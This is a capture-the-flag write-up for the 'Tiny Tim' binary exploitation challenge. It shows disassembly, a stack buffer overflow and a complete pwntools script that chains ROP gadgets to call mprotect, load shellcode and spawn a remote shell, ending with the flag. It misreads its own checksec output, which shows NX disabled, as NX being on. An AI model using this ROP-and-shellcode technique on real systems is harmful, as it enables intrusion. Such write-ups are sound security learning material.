## Tiny Tim (123 points)

### Description

Full red? Can't be that bad.

### Gathering information

We are given a rather small binary. Let's check it's protections with
`checksec`:

```  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
```

It is convenient to use `objdump` to analyze it. Here is the output of
`objdump -d -M intel tiny_tim`

```  
tiny-tim:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <secret0>:  
 401000:       58                      pop    rax  
 401001:       c3                      ret  

0000000000401002 <secret1>:  
 401002:       5e                      pop    rsi  
 401003:       c3                      ret  

0000000000401004 <secret2>:  
 401004:       5f                      pop    rdi  
 401005:       c3                      ret  

0000000000401006 <secret3>:  
 401006:       5a                      pop    rdx  
 401007:       c3                      ret  

0000000000401008 <vuln>:  
 401008:       55                      push   rbp  
 401009:       48 89 e5                mov    rbp,rsp  
 40100c:       48 83 ec 20             sub    rsp,0x20  
 401010:       48 89 e6                mov    rsi,rsp  
 401013:       48 31 c0                xor    rax,rax  
 401016:       48 31 ff                xor    rdi,rdi  
 401019:       ba 00 02 00 00          mov    edx,0x200  
 40101e:       0f 05                   syscall  
 401020:       b8 00 00 00 00          mov    eax,0x0  
 401025:       48 83 c4 20             add    rsp,0x20  
 401029:       5d                      pop    rbp  
 40102a:       c3                      ret  

000000000040102b <_start>:  
 40102b:       55                      push   rbp  
 40102c:       48 89 e5                mov    rbp,rsp  
 40102f:       b8 00 00 00 00          mov    eax,0x0  
 401034:       e8 cf ff ff ff          call   401008 <vuln>  
 401039:       48 31 f8                xor    rax,rdi  
 40103c:       b8 3c 00 00 00          mov    eax,0x3c  
 401041:       0f 05                   syscall  
 401043:       90                      nop  
 401044:       5d                      pop    rbp  
 401045:       c3                      ret  
```

We can notice in the `vuln` function that there is a buffer overflow.  
The function allocates 0x20 bytes on the stack (`sub rsp, 0x20`) but then
executes a read syscall of 0x200 bytes.

As the NX (not executable stack) protection is on, we need to execute a
ropchain.

We can also notice that we have some helper functions called secretX. It
wouldn't be possible, to the extend of my knowledge, to exploit the binary
without those.

### Exploitation

The following script gets the job done by changing the permission of the
program memory page to `rwx`, then reading some shellcode to execute and
jumping into it.

```python  
#!/usr/bin/env python3

from pwn import *

HOST = "challenges.ctfd.io"  
PORT = 30017

exe = ELF("./tiny-tim")  
rop = ROP(exe)

context.binary = exe  
context.log_level = "debug"

def conn():  
   if args.LOCAL:  
       return process([exe.path])  
   else:  
       return remote(HOST, PORT)

def main():  
   io = conn()

   # good luck pwning :)

   # ---------------- GADGETS ---------------- #  
   pop_rax = 0x0000000000401000 # pop rax; ret;  
   pop_rdi = 0x0000000000401004 # pop rdi; ret;  
   pop_rsi = 0x0000000000401002 # pop rsi; ret;  
   pop_rdx = 0x0000000000401006 # pop rdx; ret;  
   syscall = 0x0000000000401041 # syscall; nop; pop rbp; ret;  
  
   # ---------------- EXPLOIT ---------------- #

   # execve('/bin/sh', NULL, NULL) with shellcode  
   shellcode = shellcraft.sh()  
log.info(shellcode)  
   shellcode = asm(shellcode)

   stdin = 0  
   shellcode_position = 0x400000

   # Note:  
   # We are setting the registers in the following way  
   # based on the calling convention of x86_64  
   # https://www.systutorials.com/x86-64-calling-convention-by-gcc/

   # Change memory page starting at 0x400000 to be rwx  
   # mprotect(0x400000, 0x1000, 7)  
   rop.raw(pop_rdi)  
   rop.raw(shellcode_position)  
   rop.raw(pop_rsi)  
   rop.raw(0x1000)  
   rop.raw(pop_rdx)  
   rop.raw(7) # 7 = 00000111 base 2 = rwx permissions  
   rop.raw(pop_rax)  
   rop.raw(0xa) # mprotect syscall number
(https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)  
   rop.raw(syscall) # execute syscall  
   rop.raw(0) # this gets popped after the syscall

   # Write shellcode to the mprotected page  
   # read(stdin, 0x400000, len(sc))  
   rop.raw(pop_rdi)  
   rop.raw(stdin)  
   rop.raw(pop_rsi)  
   rop.raw(shellcode_position)  
   rop.raw(pop_rdx)  
   rop.raw(len(shellcode))  
   rop.raw(pop_rax)  
   rop.raw(0) # read syscall number
(https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)  
   rop.raw(syscall) # execute syscall  
   rop.raw(0) # this gets popped after the syscall

   # Jump into shellcode  
   rop.raw(shellcode_position)

   # Send exploit  
   padding  = b'A'*40  
   payload  = padding  
   payload += rop.chain()

   io.send(payload)  
   io.send(shellcode)

   # Profit  
   io.interactive()

if __name__ == "__main__":  
   main()  
```

It was also be possible to execute a ropchain to write the string '/bin/sh' to
memory and to execute execve('/bin/sh', NULL, NULL) using the string we wrote.
This would have worked even if the mprotect syscall was somehow blocked,
provided that we had some writable memory.

### The Flag

We can then `cat flag.txt` and get the flag: `UDCTF{sy5t3m_3ngage!}`